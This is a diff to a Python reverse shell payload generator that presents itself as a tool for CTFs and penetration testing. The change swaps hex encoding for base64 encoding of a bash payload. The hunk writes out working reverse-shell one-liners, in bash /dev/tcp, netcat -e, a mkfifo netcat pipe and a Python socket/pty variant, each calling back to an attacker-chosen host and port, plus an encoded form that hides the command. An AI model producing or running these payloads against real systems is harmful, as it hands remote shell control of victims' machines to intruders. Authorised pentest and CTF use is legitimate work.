@@ -6,11 +6,15 @@ Generates common reverse shell payloads for CTFs and penetration testing.
 
 import sys
 import urllib.parse
+import base64
 
 def generate_shells(lhost, lport):
+    bash_cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+    bash_b64 = base64.b64encode(bash_cmd.encode()).decode()
+    
     shells = {
         "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-        "bash_base64": f"echo {urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1\"'.encode().hex())} | xxd -r -p | bash",
+        "bash_base64": f"echo {bash_b64} | base64 -d | bash",
         "nc": f"nc -e /bin/bash {lhost} {lport}",
         "nc_alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
         "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
